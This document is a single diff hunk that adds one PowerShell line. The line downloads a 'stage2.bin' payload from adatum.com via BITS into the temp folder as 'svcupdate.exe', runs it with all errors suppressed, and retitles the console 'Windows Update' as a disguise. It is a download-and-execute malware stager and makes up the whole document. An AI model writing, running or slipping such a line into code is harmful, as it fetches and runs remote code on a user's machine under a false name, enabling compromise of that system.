@@ -1,0 +1,1 @@
+$PayloadUrl = "http://adatum.com/stage2.bin"; $LocalPath = "$env:TEMP\svcupdate.exe"; Start-BitsTransfer -Source $PayloadUrl -Destination $LocalPath -ErrorAction SilentlyContinue; Start-Process -FilePath $LocalPath -ErrorAction SilentlyContinue; $Host.UI.RawUI.WindowTitle = "Windows Update"
